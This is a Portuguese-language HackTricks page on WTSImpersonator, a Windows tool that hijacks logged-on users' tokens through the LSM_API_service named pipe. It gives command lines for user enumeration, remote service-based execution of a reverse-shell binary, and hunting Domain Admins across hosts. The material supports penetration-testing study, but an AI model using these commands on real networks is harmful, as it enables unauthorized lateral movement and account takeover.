{{#include ../../banners/hacktricks-training.md}}

A ferramenta **WTS Impersonator** explora o **"\\pipe\LSM_API_service"** RPC Named pipe para enumerar furtivamente usuários logados e sequestrar seus tokens, contornando técnicas tradicionais de Impersonação de Token. Essa abordagem facilita movimentos laterais sem interrupções dentro das redes. A inovação por trás dessa técnica é creditada a **Omri Baso, cujo trabalho está acessível no [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Funcionalidade Principal

A ferramenta opera através de uma sequência de chamadas de API:
```bash
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Módulos Principais e Uso

- **Enumeração de Usuários**: A enumeração de usuários locais e remotos é possível com a ferramenta, usando comandos para cada cenário:

- Localmente:
```bash
.\WTSImpersonator.exe -m enum
```
- Remotamente, especificando um endereço IP ou nome de host:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Execução de Comandos**: Os módulos `exec` e `exec-remote` requerem um contexto de **Serviço** para funcionar. A execução local simplesmente precisa do executável WTSImpersonator e um comando:

- Exemplo de execução de comando local:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe pode ser usado para obter um contexto de serviço:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Execução Remota de Comandos**: Envolve a criação e instalação de um serviço remotamente, semelhante ao PsExec.exe, permitindo a execução com permissões apropriadas.

- Exemplo de execução remota:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Módulo de Caça a Usuários**: Alvo de usuários específicos em várias máquinas, executando código sob suas credenciais. Isso é especialmente útil para direcionar Administradores de Domínio com direitos de administrador local em vários sistemas.
- Exemplo de uso:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

{{#include ../../banners/hacktricks-training.md}}
